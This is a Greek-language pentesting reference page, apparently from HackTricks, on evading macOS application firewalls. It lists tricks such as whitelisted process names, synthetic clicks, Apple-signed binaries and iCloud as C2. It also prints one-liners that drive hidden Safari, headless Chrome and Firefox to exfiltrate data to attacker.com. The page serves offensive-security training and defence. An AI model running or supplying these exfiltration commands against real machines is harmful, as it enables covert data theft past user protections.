# macOS Bypassing Firewalls

{{#include ../../banners/hacktricks-training.md}}

## Βρέθηκαν τεχνικές

Οι παρακάτω τεχνικές βρέθηκαν να λειτουργούν σε ορισμένες εφαρμογές firewall macOS.

### Κατάχρηση ονομάτων λευκής λίστας

- Για παράδειγμα, καλώντας το κακόβουλο λογισμικό με ονόματα γνωστών διαδικασιών macOS όπως **`launchd`**

### Συνθετικό Κλικ

- Αν το firewall ζητήσει άδεια από τον χρήστη, κάντε το κακόβουλο λογισμικό να **κλικάρει στο επιτρέπω**

### **Χρήση υπογεγραμμένων δυαδικών αρχείων της Apple**

- Όπως **`curl`**, αλλά και άλλα όπως **`whois`**

### Γνωστά domains της Apple

Το firewall θα μπορούσε να επιτρέπει συνδέσεις σε γνωστά domains της Apple όπως **`apple.com`** ή **`icloud.com`**. Και το iCloud θα μπορούσε να χρησιμοποιηθεί ως C2.

### Γενική Παράκαμψη

Ορισμένες ιδέες για να προσπαθήσετε να παρακάμψετε τα firewalls

### Έλεγχος επιτρεπόμενης κίνησης

Γνωρίζοντας την επιτρεπόμενη κίνηση θα σας βοηθήσει να εντοπίσετε πιθανά whitelisted domains ή ποιες εφαρμογές επιτρέπεται να έχουν πρόσβαση σε αυτά.
```bash
lsof -i TCP -sTCP:ESTABLISHED
```
### Κατάχρηση DNS

Οι επιλύσεις DNS γίνονται μέσω της υπογεγραμμένης εφαρμογής **`mdnsreponder`**, η οποία πιθανότατα θα επιτρέπεται να επικοινωνεί με τους διακομιστές DNS.

<figure><img src="../../images/image (468).png" alt="https://www.youtube.com/watch?v=UlT5KFTMn2k"><figcaption></figcaption></figure>

### Μέσω εφαρμογών προγράμματος περιήγησης

- **oascript**
```applescript
tell application "Safari"
run
tell application "Finder" to set visible of process "Safari" to false
make new document
set the URL of document 1 to "https://attacker.com?data=data%20to%20exfil
end tell
```
- Google Chrome
```bash
"Google Chrome" --crash-dumps-dir=/tmp --headless "https://attacker.com?data=data%20to%20exfil"
```
- Φοίνικας
```bash
firefox-bin --headless "https://attacker.com?data=data%20to%20exfil"
```
- Σαφάρι
```bash
open -j -a Safari "https://attacker.com?data=data%20to%20exfil"
```
### Μέσω εισβολών διαδικασιών

Αν μπορείτε να **εισάγετε κώδικα σε μια διαδικασία** που επιτρέπεται να συνδεθεί σε οποιονδήποτε διακομιστή, θα μπορούσατε να παρακάμψετε τις προστασίες του τείχους προστασίας:

{{#ref}}
macos-proces-abuse/
{{#endref}}

## Αναφορές

- [https://www.youtube.com/watch?v=UlT5KFTMn2k](https://www.youtube.com/watch?v=UlT5KFTMn2k)

{{#include ../../banners/hacktricks-training.md}}
